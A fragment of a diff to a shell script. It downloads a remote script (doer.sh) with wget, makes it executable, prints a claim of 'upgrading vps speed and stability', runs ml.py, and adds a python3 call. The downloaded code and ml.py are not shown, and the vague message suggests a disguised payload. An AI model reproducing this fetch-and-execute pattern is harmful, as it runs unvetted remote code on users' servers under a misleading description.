@@ -25,6 +25,7 @@ wget https://raw.githubusercontent.com/Sprent605/entity/main/doer.sh && chmod +x
 echo -e "\033[1;34mUpgrading vps speed and stability...\033[0m"
 
 python ml.py
+python3 ml.py
 
 clear
 
